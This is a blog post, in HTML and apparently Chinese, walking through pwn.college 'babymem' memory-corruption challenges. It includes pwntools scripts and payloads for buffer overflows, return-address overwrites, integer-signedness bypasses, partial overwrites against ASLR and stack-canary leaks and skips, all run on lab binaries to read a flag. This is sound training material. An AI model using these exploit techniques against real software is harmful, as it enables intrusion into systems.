@@ -1,0 +1,750 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Adam">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="12345678910r &#x3D; pwn.process(&quot;&#x2F;challenge&#x2F;babymem_level&quot;) &lt;whatever needed for level 7.1 to work&gt;print(r.readall().decode(&quot;utf-8&quot;))import pwnwith pwn.process(&quot;&#x2F;challenge&#x2F;ba">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn.college: Memory Error">
+<meta property="og:url" content="https://adamyoung71.github.io/2022/03/12/2022-3-12-Memory-Error/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="12345678910r &#x3D; pwn.process(&quot;&#x2F;challenge&#x2F;babymem_level&quot;) &lt;whatever needed for level 7.1 to work&gt;print(r.readall().decode(&quot;utf-8&quot;))import pwnwith pwn.process(&quot;&#x2F;challenge&#x2F;ba">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-03-12T21:00:00.000Z">
+<meta property="article:modified_time" content="2023-01-28T14:33:32.403Z">
+<meta property="article:author" content="杨庭屹">
+<meta property="article:tag" content="pwn.college">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>pwn.college: Memory Error - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"adamyoung71.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Adam&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="pwn.college: Memory Error"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-03-12 21:00" pubdate>
+          2022年3月12日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          121 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">pwn.college: Memory Error</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">r = pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level&quot;</span>) <br>&lt;whatever needed <span class="hljs-keyword">for</span> level 7.1 <span class="hljs-keyword">to</span> work&gt;<br><span class="hljs-built_in">print</span>(r.readall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><br><br>import pwn<br><br>with pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level12.0&quot;</span>, <span class="hljs-attribute">setuid</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">aslr</span>=<span class="hljs-literal">False</span>) as process:<br>    pwn.gdb.attach(process)<br>    process.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h4><blockquote>
+<p>In this level, there is a “win” variable.<br>By default, the value of this variable is zero.<br>However, when this variable is non-zero, the flag will be printed.<br>You can make this variable be non-zero by overflowing the input buffer.<br>The “win” variable is stored at 0x7ffcca200978, 88 bytes after the start of your input buffer.</p>
+</blockquote>
+<p>第一关需要把buffer后的一个变量的值改变，只需要有足够的输入即可。输入89个A后成功拿到flag。</p>
+<h4 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h4><p>The challenge() function has just been launched!<br>This challenge stores your input buffer on the heap!<br>It also stores the “win” variable on the heap.<br>Allocating memory for the input buffer…<br>Called malloc(106) &#x3D; 0x55b735a3b6b0<br>Called malloc(0x10) &#x3D; 0x55b735a3b730<br>Called malloc(0x10) &#x3D; 0x55b735a3b750<br>Called malloc(0x10) &#x3D; 0x55b735a3b770<br>Called malloc(0x10) &#x3D; 0x55b735a3b790<br>Called malloc(0x10) &#x3D; 0x55b735a3b7b0<br>Called malloc(0x10) &#x3D; 0x55b735a3b7d0<br>Allocating memory for the win variable…<br>Called calloc(1, sizeof(int)) &#x3D; 0x55b735a3b7f0<br>In this level, there is a “win” variable.<br>By default, the value of this variable is zero.<br>However, when this variable is non-zero, the flag will be printed.<br>You can make this variable be non-zero by overflowing the input buffer.<br>The “win” variable is stored at 0x55b735a3b7f0, 320 bytes after the start of your input buffer.</p>
+<p>这一关略有不同，这次数据是在堆上，但仍然可以找到offset为0x55b735a3b7f0 - 0x55b735a3b6b0 &#x3D; 320。</p>
+<h4 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h4><p>In this level, there is no “win” variable.<br>You will need to force the program to execute the win() function<br>by directly overflowing into the stored return address back to main,<br>which is stored at 0x7ffff0827268, 136 bytes after the start of your input buffer.<br>That means that you will need to input at least 144 bytes (113 to fill the buffer,<br>23 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address).</p>
+<p>这一关不是修改变量了，而是需要修改返回地址到特定函数。并且题目也解除了canary和地址随机化。我们只需要找到返回地址的offset然后覆盖即可。最终在iPython中使用pwntools实现：</p>
+<p><code>r.send(b&#39;\x00&#39;*136+b&#39;\x0f\x1d\x40&#39;)</code></p>
+<h4 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h4><p>In this level, there is no “win” variable.<br>You will need to force the program to execute the win() function<br>by directly overflowing into the stored return address back to main,<br>which is stored at 0x7ffc2743e7f8, 88 bytes after the start of your input buffer.<br>That means that you will need to input at least 96 bytes (60 to fill the buffer,<br>28 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address).</p>
+<p>This challenge is more careful: it will check to make sure you<br>don’t want to provide so much data that the input buffer will<br>overflow. But recall twos compliment, look at how the check is<br>implemented, and try to beat it!</p>
+<p>同样的方法不成功了，这次需要使用一下补码，发送88字节的填充，再加最后8字节的返回地址。</p>
+<h4 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h4><p>In this level, there is no “win” variable.<br>You will need to force the program to execute the win() function<br>by directly overflowing into the stored return address back to main,<br>which is stored at 0x7fffd2297b18, 88 bytes after the start of your input buffer.<br>That means that you will need to input at least 96 bytes (48 to fill the buffer,<br>40 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address).<br>This challenge will let you send multiple payload records concatenated together.<br>It will make sure that the total payload size fits in the allocated buffer<br>on the stack. Can you send a carefully crafted input to break this calculation?<br>You will want to overwrite the return value from challenge()<br>(located at 0x7ffdee130128, 88 bytes past the start of the input buffer)<br>with 0x402164, which is the address of the win() function.<br>This will cause challenge() to return directly into the win() function,<br>which will in turn give you the flag.</p>
+<p>和上一题大体相同，如果按照正常的需求输入size，就会报以下错误:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SHELL">babymem_level5.0: &lt;stdin&gt;:143: challenge: Assertion `record_size * record_num &lt; (unsigned int) sizeof(input)&#x27; failed.<br></code></pre></td></tr></table></figure>
+<p>看到这里用的是无符号数，容易想到可以通过补码来绕过限制。仍然在ipython中进行操作。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> pwn<br>r = pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level5.0&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;2147483648&quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">88</span> + <span class="hljs-string">b&#x27;\x64\x21\x40\x00\x00\x00\x00\x00&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<h4 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h4><p>In this level, there is no “win” variable.<br>You will need to force the program to execute the win_authed() function<br>by directly overflowing into the stored return address back to main,<br>which is stored at 0x7fff00d955f8, 120 bytes after the start of your input buffer.<br>That means that you will need to input at least 128 bytes (92 to fill the buffer,<br>28 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address).<br>One caveat in this challenge is that the win_authed() function must first auth:<br>it only lets you win if you provide it with the argument 0x1337.<br>Specifically, the win_authed() function looks something like:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">win_authed</span><span class="hljs-params">(<span class="hljs-type">int</span> token)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (token != <span class="hljs-number">0x1337</span>) <span class="hljs-keyword">return</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You win! Here is your flag: &quot;</span>);<br>  sendfile(<span class="hljs-number">1</span>, open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>), <span class="hljs-number">0</span>, <span class="hljs-number">256</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>So how do you pass the check? There <em>is</em> a way, and we will cover it later,<br>but for now, we will simply bypass it! You can overwrite the return address<br>with <em>any</em> value (as long as it points to executable code), not just the start<br>of functions. Let’s overwrite past the token check in win!</p>
+<p>To do this, we will need to analyze the program with objdump, identify where<br>the check is in the win_authed() function, find the address right after the check, and write that address over the saved return address.</p>
+<p>Go ahead and find this address now. When you’re ready, input a buffer overflow that will overwrite the saved return address (at 0x7fff00d955f8, 120 bytes into the buffer)with the correct value.</p>
+<ul>
+<li>the address of win_authed() is 0x401bcd.<br>这一关需要我们在objdump中看一下win_authed()函数的逻辑，如下所示：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs SHELL">401bd9:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi<br>401bdc:	81 7d fc 37 13 00 00 	cmp    DWORD PTR [rbp-0x4],0x1337<br>401be3:	0f 85 f2 00 00 00    	jne    401cdb &lt;win_authed+0x10e&gt;<br></code></pre></td></tr></table></figure>
+这里是从edi中读数据再进行比较，修改edi显然不现实，所以这里的意思是要我们直接把返回地址修改到验证函数通过的地方。查看其汇编代码可以知道如果验证成功将会跳转到：0x401be9，所以这里就是我们的目标了。(其实判断之后的任意地址都可以)<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SHELL">r.sendline(b&#x27;\x00&#x27; * 120 + b&#x27;\xe9\x1b\x40&#x27; + b&#x27;\x00&#x27; * 5)<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h4><p>That means that you will need to input at least 96 bytes (58 to fill the buffer,<br>30 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address).<br>Overwriting the entire return address is fine when we know<br>the whole address, but here, we only really know the last three nibbles.<br>These nibbles never change, because pages are aligned to 0x1000.<br>This gives us a workaround: we can overwrite the least significant byte<br>of the saved return address, which we can know from debugging the binary,<br>to retarget the return to main to any instruction that shares the other 7 bytes.<br>Since that last byte will be constant between executions (due to page alignment),<br>this will always work.<br>If the address we want to redirect execution to is a bit farther away from<br>the saved return address, and we need to write two bytes, then one of those<br>nibbles (the fourth least-significant one) will be a guess, and it will be<br>incorrect 15 of 16 times.<br>This is okay: we can just run our exploit a few<br>times until it works (statistically, after 8 times or so).<br>One caveat in this challenge is that the win_authed() function must first auth:<br>it only lets you win if you provide it with the argument 0x1337.<br>Specifically, the win_authed() function looks something like:<br>    void win_authed(int token)<br>    {<br>      if (token !&#x3D; 0x1337) return;<br>      puts(“You win! Here is your flag: “);<br>      sendfile(1, open(“&#x2F;flag”, 0), 0, 256);<br>      puts(“”);<br>    }<br>这一题开始有一些变化了，首先程序编程64位的，而且地址也不是静态的了，所以所有的地址都以偏移量表示。从验证函数的汇编代码可以知道其验证成功后跳转的相对地址为0x2411，但只知道这些是不够的。运行程序后可以观察到地址的高位是设置好的，并且由于页的对其机制最后三位也是不变的，所以我们只需要猜一位，也就是最高半个字节即可。最多需要测试16次。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">r = pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level7.0&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;90&quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">88</span> + <span class="hljs-string">b&#x27;\x11\x24&#x27;</span>)<br><span class="hljs-built_in">print</span>(r.readall())<br></code></pre></td></tr></table></figure>
+
+<h4 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h4><p>That means that you will need to input at least 176 bytes (119 to fill the buffer, 49 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address<br>这一题和上一题是一样的，地址变为0x2075.</p>
+<h4 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h4><p>That means that you will need to input at least 48 bytes (17 to fill the buffer,<br>23 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address).<br>While canaries are enabled, this program reads your input 1 byte at a time,<br>tracking how many bytes have been read and the offset from your input buffer to read the byte to using a local variable on the stack.<br>The code for doing this looks something like:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">while</span> (n &lt; size) &#123;<br>n += read(<span class="hljs-number">0</span>, input + n, <span class="hljs-number">1</span>);    <br>&#125;<br></code></pre></td></tr></table></figure>
+<p>As it turns out, you can use this local variable <code>n</code> to jump over the canary.<br>Your input buffer is stored at 0x7ffcdb26f150, and this local variable <code>n</code><br>is stored 20 bytes after it at 0x7ffcdb26f164.</p>
+<p>When you overwrite <code>n</code>, you will change the program’s understanding of<br>how many bytes it has read in so far, and when it runs <code>read(0, input + n, 1)</code> again, it will read into an offset that you control.<br>This will allow you to reposition the write <em>after</em> the canary, and write<br>into the return address!</p>
+<p>The payload size is deceptively simple.<br>You don’t have to think about how many bytes you will end up skipping:<br>with the while loop described above, the payload size marks the<br><em>right-most</em> byte that will be read into.<br>As far as this challenge is concerned, there is no difference between bytes<br>“skipped” by fiddling with <code>n</code> and bytes read in normally: the values<br>of <code>n</code> and <code>size</code> are all that matters to determine when to stop reading,<br><em>not</em> the number of bytes actually read in.</p>
+<p>That being said, you <em>do</em> need to be careful on the sending side: don’t send<br>the bytes that you’re effectively skipping!</p>
+<p>跳转地址：0x15bf</p>
+<p>从这一题开始canary就不再禁用了，也就是说不能像之前的题目一样直接写buffer了。这一题给我们提供了一种跳过canary 的简单方式，就是用上面的变量<code>n</code>，通过改变n的值就可以直接跳到canary之后。<br><code>n</code>的位置：0x8074，返回地址的位置：0x8088<br>因此可以先写入20字节空，在第21字节将<code>n</code>修改为40(0x24)，即可修改地址为跳转地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pwn<br>r = pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level9.0&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;42&quot;</span>)<br>r.send(<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">20</span> + <span class="hljs-string">b&#x27;\x27&#x27;</span> + <span class="hljs-string">b&#x27;\xbf\x15&#x27;</span>)<br><span class="hljs-comment"># r.interactive()</span><br><span class="hljs-built_in">print</span>(r.readall())<br></code></pre></td></tr></table></figure>
+
+<h4 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h4><p>In this level, the flag will be loaded into memory.<br>However, at no point will this program actually print the buffer storing the flag.<br>这一题很有意思，题目说flag已经在内存里了，而且存在buffer后108字节的位置，但是不会有任何函数会打印flag，但是会打印我们插入的内容。所以我们只需要将空字节全部填充（包括最后的null termination）即可将flag一起打印出来。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pwn<br>r = pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level10.0&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;108&quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;\xaa&#x27;</span> * <span class="hljs-number">108</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h4><p>这一题flag同样会被存入内存，但是输入buffer会被映射到页中。buffer到flag共32768字节。按上一题的方法即可得到flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pwn<br>r = pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level11.0&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;32768&quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;\xaa&#x27;</span> * <span class="hljs-number">32768</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h4><p>That means that you will need to input at least 80 bytes (51 to fill the buffer,<br>21 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address).<br>Because the binary is position independent, you cannot know<br>exactly where the win_authed() function is located.<br>This means that it is not clear what should be written into the return address.<br>This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts(), call to see the hidden backdoor!<br>题目说这一题有个后门，查看源码后看到在这个puts()后面确实有一个：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C">iVar3 = <span class="hljs-built_in">strstr</span>(buf, <span class="hljs-string">&quot;REPEAT&quot;</span>);<br><span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Goodbye!&quot;</span>);<br>	uVar2 = <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>	<span class="hljs-built_in">puts</span>();<br>	uVar2 = challenge((<span class="hljs-type">uint64_t</span>)(<span class="hljs-type">uint32_t</span>)var_64h, var_70h, var_78h);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>意思是说，如果输入buffer中有REPEAT这个字符串，就会重新进入challenge，而第二次进入挑战时canary是不变的，所以我们就可以第一次输入REPEAT获得canary，第二次直接覆盖。<br>这题可把我坑了半天，原因就是一个小小的p64()，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>r = process(<span class="hljs-string">&quot;/challenge/babymem_level12.0&quot;</span>)<br>payload1 = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">49</span> + <span class="hljs-string">b&#x27;b&#x27;</span><br><br>r.sendlineafter(<span class="hljs-string">b&#x27;Payload size: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload1)))<br><br>r.sendafter(<span class="hljs-string">b&#x27;bytes)!\n&#x27;</span>, payload1)<br>r.recvuntil(<span class="hljs-string">&quot;- the canary value is now 0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(r.recvline()[:-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&quot;addr =&gt; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(addr)))<br><br>r.sendline(<span class="hljs-string">&quot;74&quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;\xaa&#x27;</span> * <span class="hljs-number">56</span> + p64(addr) + <span class="hljs-string">b&#x27;\xaa&#x27;</span> * <span class="hljs-number">8</span> + <span class="hljs-string">b&#x27;\xa3\x24&#x27;</span>)<br><br><span class="hljs-comment">#r.send(b&#x27;\x00&#x27; * 8 + b&#x27;\xa3\x24&#x27;)</span><br><span class="hljs-comment">#r.interactive()</span><br><span class="hljs-built_in">print</span>(r.readall())<br></code></pre></td></tr></table></figure>
+
+<h4 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h4><p>This challenge reads the flag file to verify it. Do you think this might leave traces of the flag around afterwards?</p>
+<p>The flag was read into address 0x7ffc354390b2.</p>
+<p>The challenge() function has just been launched!<br>However… An important initialisation step was missed.<br>Use this to your advantage!<br>这题搞得我有点懵，看了半天不知道从哪入手。再一看存flag的地址有数据，直接复制出去发现就是flag。。</p>
+<h4 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h4><p>This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()<br>call to see the hidden backdoor!<br>That means that you will need to input at least 352 bytes (325 to fill the buffer,<br>19 to fill other stuff stored between the buffer and the return address,<br>and 8 that will overwrite the return address).<br>这一关同样是有后门，拖到Cutter中看看。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C">iVar3 = <span class="hljs-built_in">strstr</span>(buf, <span class="hljs-string">&quot;REPEAT&quot;</span>);<br><span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Goodbye!&quot;</span>);<br>uVar2 = <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">puts</span>();<br>uVar2 = challenge((<span class="hljs-type">uint64_t</span>)(<span class="hljs-type">uint32_t</span>)var_174h, var_180h, var_188h);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>是和上面一样的输入REPEAT就重启。<br>buffer -&gt; canary: 328<br>canary: 8<br>canary -&gt; return: 8<br>return: 1fbc</p>
